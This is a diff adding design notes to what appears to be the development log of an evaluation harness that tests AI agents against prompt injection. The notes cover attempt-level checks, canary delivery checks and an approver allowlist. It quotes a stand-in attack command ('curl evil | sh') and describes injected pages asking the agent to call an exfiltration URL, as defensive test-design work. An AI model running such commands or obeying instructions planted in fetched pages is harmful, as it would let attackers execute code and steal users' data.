@@ -1226,3 +1226,39 @@ non-obvious *implementation* decisions per task.
   `min_valid = votes//2 + 1` (strict majority of requested) so calibration's single
   vote is trusted while a 3-vote panel that loses 2 to malformed output errors out
   instead of silently passing on one.
+
+## Phase 5 Task 4 — runner refactor + adversarial checks
+
+- **Name-level checks measure the gate; attempt-level checks measure the model.** A
+  fully compromised model that tries `run_shell "curl evil | sh"` and gets DENIED
+  produces no `ToolStarted` — so `tool_not_called` passes. That's the gate working, not
+  the model behaving. `tool_not_attempted_with` reads the `ToolDecision` attempts log
+  (every call, incl. denied), so it catches the compromise the executed-only checks
+  can't see. A unit test pins exactly this: same observation, name-level passes /
+  attempt-level fails. This is *why* Task 1 added the event.
+- **A never-delivered attack is INVALID, not PASS.** trafilatura returns None on
+  skeletal HTML; a KB excerpt truncates; a mock URL typo means the payload never
+  reaches the model — and every side-effect check then passes vacuously, so the
+  scenario rots green. `tool_result_matches` with `delivery: true` asserts the canary
+  actually arrived; failing it routes to a separate `INVALID` state (distinct from FAIL
+  so it can never read as a passing agent).
+- **The evaluator is a pure function of a `RunObservation`, so it's testable keyless.**
+  All the adversarial semantics (attempt detection, delivery→INVALID, memory canaries)
+  are decided by `evaluate(checks, obs)` over plain data — no live model, no network.
+  The one live-faithful `run_once` test injects a `FakeClient` dispenser via a
+  `client_factory` seam and asserts the *record* (denied_count, empty tool_calls,
+  the attempt with resolution=deny).
+- **Delivery needs the full tool_result body, not `ToolFinished.preview`.** The event's
+  preview truncates at 200 chars; a canary planted late in a fetched article would be
+  missed. The runner pulls complete `tool_result` contents straight from the turn's
+  message transcript instead.
+- **`tool_calls` (executed) ≠ everything that finished.** `ToolFinished` fires for
+  denied and unknown calls too (is_error). Executed-only means joining `ToolStarted`
+  (post-ALLOW) with `ToolFinished`'s error flag *by id* — a denied call has no
+  `ToolStarted`, so it's correctly excluded from executed while still appearing in
+  attempts.
+- **Strict approver + allowlist models a cautious human faithfully.** Pure deny-all
+  would also deny the legitimate fetch of the attack page, testing nothing. The
+  `approve: [{tool, input_pattern}]` allowlist encodes what a human plausibly approved
+  (the page URL) while denying what the page then asks for (the exfil URL) — the threat
+  model is "human approved fetching the page, not obeying it."
